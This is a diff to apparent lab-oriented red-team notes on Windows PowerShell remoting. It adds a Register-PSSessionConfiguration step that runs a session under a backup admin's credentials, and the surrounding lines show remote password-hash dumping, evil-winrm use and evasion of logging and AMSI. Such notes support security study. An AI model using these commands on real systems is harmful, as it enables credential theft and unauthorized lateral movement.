@@ -44,6 +44,18 @@ Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Conten
 Invoke-Command -ScriptBlock{whoami;hostname} -Session $victim
 ```
 ---
+### Register-PSSessionConfiguration
+```powershell
+Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+```
+- Restart the WinRM service
+```powershell
+Restart-Service WinRM
+```
+
+>Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup.
+
+---
 ### Winrs
 - _Evade logging & AMSI_
 - Port: 5985
